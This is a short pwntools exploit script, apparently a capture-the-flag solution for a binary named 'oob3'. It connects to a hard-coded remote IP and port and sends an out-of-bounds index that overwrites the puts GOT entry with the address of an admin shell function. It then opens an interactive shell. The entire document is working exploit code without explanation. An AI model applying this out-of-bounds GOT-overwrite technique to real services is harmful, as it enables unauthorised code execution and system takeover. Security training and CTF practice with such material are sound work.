from pwn import *

puts_plt = 0x601018 
admin_shell = 0x400924

r = remote('140.110.112.77', 3113)
#r = process('oob3')
raw_input('debug')
r.recvuntil('ID: ')
r.sendline(str((0x601018 - 0x6010c0) / 8))
r.recvuntil('Nickname: ')
r.sendline(p64(admin_shell))
r.recvuntil('PIN: ')
r.sendline('1')
r.interactive()
